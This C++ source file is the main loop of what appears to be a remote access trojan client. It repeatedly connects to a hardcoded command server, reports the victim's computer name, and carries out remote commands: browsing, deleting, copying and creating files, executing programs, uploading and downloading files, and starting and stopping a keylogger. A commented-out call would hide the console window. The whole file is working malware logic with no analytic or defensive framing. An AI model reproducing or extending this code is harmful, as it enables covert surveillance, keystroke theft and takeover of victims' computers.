#include		<iostream>
#include		<Windows.h>
#include		<string.h>
#include		<string>

#include		"RxVersion.h"
#include		"RxNetOut.h"
#include		"RxKeyLog.h"
#include		"RxUtility.h"
#include		"RxAnswerFs.h"
#include		"RxClientUpDown.h"

char*			software_version = SOFTWARE_VERSION;

void			AnsVersion(RxWSocket& sock)
{
	RxPacket*	np;

	np = new RxPacket();
	memset(np, 0, sizeof(*np));
	memcpy(np->data, software_version, SIZE_VERSION);
	np->type = T_ANS_VERSION;
	AddToSendList(np);
}

#define			FOREVER_AND_EVER_AND_EVER	while (1)

int				main(int ac, char* av)
{
	//FreeConsole();
	RxFileSystem	fs;
	bool			isRunning = true;

	FOREVER_AND_EVER_AND_EVER
	{
		if (sock.Connect(IP_SERVER, SV_BASE_PORT) == true)
		{
			RxPacket			p;
			int					chekret;
			int					offset;

			offset = 0;
			isRunning = true;
			memset(&p, 0, sizeof(p));
			p.type = T_IDENTIFICATION;
			memcpy(p.data, RxGetComputerName().c_str(), RxGetComputerName().size());
			sock.Send((char*)&p, sizeof(p));
			while (isRunning == true)
			{
				if (offset == 0)
					memset(&p, 0, sizeof(p));
				chekret = sock.Receive((char*)&p + offset, sizeof(p) - offset);
				if (chekret <= 0)
				{
					isRunning = false;
					sock.Disconnect();
					break;
				}
				else if (chekret + offset == sizeof(RxPacket))
				{
					offset = 0;
					if (p.type == T_ASK_VERSION)
						AnsVersion(sock);
					else if (p.type == T_ASK_FS)
						AnsAskFs(sock, fs);
					else if (p.type == T_ASK_CD)
						AnsAskCd(sock, fs, p);
					else if (p.type == T_ASK_DELETE)
						AnsAskDel(sock, fs, p);
					else if (p.type == T_ASK_COPY)
						AnsAskCpy(sock, fs, p);
					else if (p.type == T_ASK_PASTE)
						AnsAskPst(sock, fs, p);
					else if (p.type == T_ASK_RENAME)
						AnsAskRnm(sock, fs, p);
					else if (p.type == T_ASK_CRT_FILE)
						AnsAskCrt(sock, fs, p);
					else if (p.type == T_ASK_EXEC)
						AnsAskExe(sock, fs, p);
					else if (p.type == T_ASK_KEYLOG)
						AnsAskAkl();
					else if (p.type == T_ASK_KEYLOG_STOP)
						AnsAskOkl();
					else if (p.type == T_ASK_DOWNLOAD)
						AnsAskDwl(sock, p);
					else if (p.type == T_ASK_UPLOAD)
						AnsAskUpl(sock, p);
					else
						; //
				}
				else
					offset = offset + chekret;
				SendingLoop();
				Sleep(10);
			}
		}
		if (keyLogThread != NULL && CloseHandle(keyLogThread) == true)
		{
			keyLogThread = NULL;
		}
		Sleep(5000);
	}
	return (0);
}
